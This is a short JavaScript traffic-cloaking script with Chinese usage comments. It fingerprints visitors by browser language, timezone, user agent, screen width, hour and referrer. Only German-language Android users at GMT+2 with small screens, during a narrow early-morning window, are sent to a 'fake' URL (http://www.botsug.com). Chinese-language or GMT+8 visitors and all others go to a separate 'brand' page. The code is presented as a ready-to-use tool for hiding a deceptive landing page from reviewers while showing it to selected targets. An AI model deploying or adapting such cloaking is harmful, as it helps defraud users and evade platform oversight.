//流量筛选器：浏览器语言 所在时区 屏幕分辨率 UA IP 设备 所在时段 流量来源 浏览器类型

//原始URL 跳转URL

//使用方法：
//先更改时间
//更改浏览器语言
//选择设备
//更改时区

(function (brandurl, fakeurl)
{
    var url = fakeurl, language = 'zh', ua = '', allownoneref = 1, dt = new Date(), s_width = 0, s_height = 0, strtimes = "GMT+0800";
    try
    {
        language = (navigator.language || navigator.browserLanguage).toLowerCase();
        ua = navigator.userAgent.toLowerCase();
        s_width = screen.width;
        s_height = screen.height;
        strtimes = dt.toTimeString();
    }
    catch (e)
    {

    }
    if (language.indexOf('zh') > -1 || strtimes.indexOf('GMT+0800') > 0 || strtimes.indexOf('UTC+0800') > 0 || !(dt.getHours() >= 4 && dt.getHours() <= 6))
    {
        url = brandurl;
    }
    else
    {
        if ((language.indexOf('de') > -1) &&
            (strtimes.indexOf('GMT+0200') > 0 || strtimes.indexOf('UTC+0200') > 0) &&
            (ua.match(/android/i) == "android") && (s_width <= 480))
        {
            url = fakeurl;
        }
        else
        {
            url = brandurl;
        }
    }
    if (url.length > 0 && (document.referrer.length > 0 || allownoneref == 1))
        location.href = url;
})('', 'http://www.botsug.com');